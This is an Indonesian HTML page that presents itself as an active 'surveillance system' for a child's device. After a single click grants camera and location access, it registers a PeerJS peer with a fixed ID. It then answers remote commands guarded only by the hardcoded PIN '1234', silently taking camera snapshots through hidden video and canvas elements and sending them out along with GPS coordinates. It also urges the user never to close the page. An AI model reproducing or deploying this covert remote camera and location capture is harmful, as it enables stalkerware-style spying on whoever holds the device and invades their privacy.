<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sistem Aktif</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body{font-family:sans-serif;background:#f2f4f7;text-align:center;padding:40px}
    .card{background:#fff;padding:25px;border-radius:14px;box-shadow:0 6px 14px rgba(0,0,0,.1)}
    button{padding:14px 22px;border:0;border-radius:10px;background:#3498db;color:#fff;font-size:16px}
    .ok{color:#2ecc71;font-weight:bold}
    .off{color:#e74c3c}
  </style>
</head>
<body>

<div class="card">
  <h3>ðŸ”’ Sistem Pengawasan Aktif</h3>
  <p>Klik sekali lalu biarkan</p>
  <button onclick="aktifkan()">AKTIFKAN</button>
  <p id="stat" class="off">Status: Belum Aktif</p>
</div>

<video id="v" autoplay playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
  const PAIR_PIN = "1234";          // samakan dengan remote.html
  const PEER_ID  = "anak_device_01";

  let stream, peer, conn;

  async function aktifkan(){
    try{
      stream = await navigator.mediaDevices.getUserMedia({video:true});
      await new Promise((res,rej)=>{
        navigator.geolocation.getCurrentPosition(res,rej);
      });

      peer = new Peer(PEER_ID);

      peer.on("connection",(c)=>{
        c.on("data",(d)=>{
          if(d.pin !== PAIR_PIN) return;
          conn = c;
          if(d.cmd === "FOTO") ambilFoto();
          if(d.cmd === "LOKASI") kirimLokasi();
        });
      });

      document.getElementById("stat").innerHTML =
        "Status: Aktif & Online âœ…<br><small>Jangan ditutup</small>";
      document.getElementById("stat").className="ok";
      alert("Aktif. Jangan ditutup.");

    }catch(e){
      alert("Harus diizinkan agar sistem berjalan");
    }
  }

  function ambilFoto(){
    const v=document.getElementById("v");
    const c=document.getElementById("c");
    v.srcObject=stream;
    setTimeout(()=>{
      c.width=v.videoWidth;
      c.height=v.videoHeight;
      c.getContext("2d").drawImage(v,0,0);
      conn.send({type:"FOTO",data:c.toDataURL("image/jpeg")});
    },800);
  }

  function kirimLokasi(){
    navigator.geolocation.getCurrentPosition(p=>{
      conn.send({
        type:"LOKASI",
        lat:p.coords.latitude,
        lon:p.coords.longitude
      });
    });
  }
</script>

</body>
</html>
